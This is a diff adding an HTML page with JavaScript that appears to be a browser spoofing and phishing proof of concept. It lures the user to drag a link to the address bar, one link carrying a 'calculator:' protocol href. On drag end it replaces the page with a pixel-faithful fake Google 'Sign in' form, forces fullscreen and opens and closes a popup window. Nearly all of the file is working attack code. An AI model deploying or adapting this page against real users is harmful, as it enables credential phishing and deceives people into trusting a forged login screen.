@@ -1,0 +1,63 @@
+<html>
+<title>Puf</title>
+<body>
+<br><br>
+  <Center> <h1 id="demo"> Drag Link to Addressbar </h1> </Center>
+
+<Center> <a id="uiLinkUrlDownload"  onclick='return false;' oncontextmenu='return false;' href='calculator:Google.com'> <img src='cursor.png' /></a>
+  <a id="linkurl" href='https://www.google.com' oncontextmenu='return false;' onclick='return false;'>Drag this Link to Addressbar</a> </Center>
+                           
+                                                     
+<script>   
+const googleLoginHTML = `
+  <div style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; height: 100vh; width: 100vw; background-color: #202124; color: #fff; display: flex; justify-content: center; align-items: center; margin: 0; padding: 0;">
+    <div style="background-color: #202124; border: 1px solid #5f6368; border-radius: 8px; padding: 48px 40px 36px; width: 100%; max-width: 448px; box-sizing: border-box; text-align: center;">
+      <svg xmlns="http://www.w3.org/2000/svg" width="75" height="24" viewBox="0 0 75 24" style="margin-bottom: 16px;">
+        <g fill="none" fill-rule="evenodd">
+          <path fill="#4285F4" fill-rule="nonzero" d="M31.64 10.328c0-.756-.063-1.465-.18-2.143H22v4.148h5.454a4.672 4.672 0 0 1-2.008 3.093v2.545h3.226c1.888-1.74 2.968-4.305 2.968-7.643z"/>
+          <path fill="#34A853" fill-rule="nonzero" d="M22 20.151c2.71 0 4.985-.898 6.645-2.435l-3.226-2.545c-.898.602-2.046.966-3.419.966-2.628 0-4.852-1.776-5.646-4.167H13v2.64C14.655 17.886 18.064 20.151 22 20.151z"/>
+          <path fill="#FBBC05" fill-rule="nonzero" d="M16.354 11.97c-.203-.603-.319-1.25-.319-1.92s.116-1.318.32-1.921V5.488H13C12.36 6.762 12 8.355 12 10.05c0 1.696.36 3.288.998 4.562l3.356-2.642z"/>
+          <path fill="#EA4335" fill-rule="nonzero" d="M22 3.949c1.472 0 2.793.508 3.834 1.498l2.875-2.875C26.983 1.05 24.708 0 22 0 18.064 0 14.655 2.265 13 5.488l3.356 2.642C17.148 5.726 19.372 3.949 22 3.949z"/>
+        </g>
+      </svg>
+      <h1 style="font-size: 24px; font-weight: 400; margin: 0 0 8px; color: #e8eaed;">Sign in</h1>
+      <p style="font-size: 16px; margin: 0 0 32px; color: #e8eaed;">Use your Google Account</p>
+      
+      <div style="position: relative; margin-bottom: 40px; text-align: left;">
+        <input type="text" style="width: 100%; padding: 13px 15px; background: transparent; border: 1px solid #5f6368; border-radius: 4px; color: #e8eaed; font-size: 16px; box-sizing: border-box; outline: none;" placeholder="Email or phone">
+        <a href="#" style="color: #8ab4f8; text-decoration: none; font-size: 14px; font-weight: 500; display: inline-block; margin-top: 8px;">Forgot email?</a>
+      </div>
+      
+      <div style="text-align: left; margin-bottom: 40px;">
+        <p style="font-size: 14px; color: #9aa0a6; margin: 0;">Not your computer? Use Guest mode to sign in privately.</p>
+        <a href="#" style="color: #8ab4f8; text-decoration: none; font-size: 14px; font-weight: 500;">Learn more</a>
+      </div>
+      
+      <div style="display: flex; justify-content: space-between; align-items: center;">
+        <a href="#" style="color: #8ab4f8; text-decoration: none; font-size: 14px; font-weight: 500;">Create account</a>
+        <button style="background-color: #8ab4f8; color: #202124; border: none; border-radius: 4px; padding: 10px 24px; font-size: 14px; font-weight: 500; cursor: pointer;">Next</button>
+      </div>
+    </div>
+  </div>
+`;
+
+function showGoogleLogin() {
+  document.body.innerHTML = googleLoginHTML;
+  document.body.style.margin = "0";
+  document.body.style.padding = "0";
+  document.body.style.overflow = "hidden";
+  document.documentElement.requestFullscreen();
+}
+
+  document.getElementById('uiLinkUrlDownload').ondragend = function(event){
+      showGoogleLogin();
+   var myWindow =  window.open("", "_blank", "toolbar=yes,scrollbars=yes,resizable=yes,top=20,left=400,width=500,height=100").close();
+  }         
+
+
+document.getElementById('linkurl').ondragend = function(event){    
+    showGoogleLogin();
+   var myWindow = window.open("", "_blank", "toolbar=yes,scrollbars=yes,resizable=yes,top=20,left=400,width=500,height=100").close();
+  }     
+</script>     
+</body></html>
